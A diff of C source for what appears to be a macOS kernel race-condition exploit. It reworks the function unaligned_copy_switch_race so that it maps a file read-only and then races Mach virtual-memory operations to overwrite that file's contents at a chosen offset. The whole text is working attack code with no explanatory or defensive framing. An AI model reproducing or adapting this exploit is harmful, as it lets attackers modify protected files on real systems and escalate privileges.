@@ -87,8 +87,8 @@ switcheroo_thread(__unused void *arg)
 	return NULL;
 }
 
-bool unaligned_copy_switch_race(void* page_to_overwrite, const void* overwrite_data, size_t overwrite_length) {
-  bool retval = false;
+bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const void* overwrite_data, size_t overwrite_length) {
+	bool retval = false;
 	pthread_t th = NULL;
 	int ret;
 	kern_return_t kr;
@@ -104,12 +104,21 @@ bool unaligned_copy_switch_race(void* page_to_overwrite, const void* overwrite_d
 	vm_address_t ro_addr, tmp_addr;
 	memory_object_size_t mo_size;
 
-	if (!memcmp(page_to_overwrite, overwrite_data, overwrite_length)) {
-		return true; // it's already fine?
-	}
-
 	ctx = &context1;
 	ctx->obj_size = 256 * 1024;
+
+	void* file_mapped = mmap(NULL, ctx->obj_size, PROT_READ, MAP_SHARED, file_to_overwrite, file_offset);
+	if (file_mapped == MAP_FAILED) {
+		fprintf(stderr, "failed to map\n");
+		return false;
+	}
+	if (!memcmp(file_mapped, overwrite_data, overwrite_length)) {
+		fprintf(stderr, "already the same?\n");
+		munmap(file_mapped, ctx->obj_size);
+		return true;
+	}
+	ro_addr = file_mapped;
+
 	ctx->e0 = 0;
 	ctx->running_sem = dispatch_semaphore_create(0);
 	T_QUIET; T_ASSERT_NE(ctx->running_sem, NULL, "dispatch_semaphore_create");
@@ -128,7 +137,7 @@ bool unaligned_copy_switch_race(void* page_to_overwrite, const void* overwrite_d
 	/* initialize to 'A' */
 	memset((char *)ro_addr, 'A', ctx->obj_size);
 #endif
-	ro_addr = (vm_address_t)page_to_overwrite;
+
 	/* make it read-only */
 	kr = vm_protect(mach_task_self(),
 	    ro_addr,
@@ -338,10 +347,8 @@ bool unaligned_copy_switch_race(void* page_to_overwrite, const void* overwrite_d
 	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_rw)");
 	kr = mach_port_deallocate(mach_task_self(), ctx->mem_entry_ro);
 	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_ro)");
-#if 0
 	kr = vm_deallocate(mach_task_self(), ro_addr, ctx->obj_size);
 	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(ro_addr)");
-#endif
 	kr = vm_deallocate(mach_task_self(), e5, ctx->obj_size);
 	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(e5)");
 
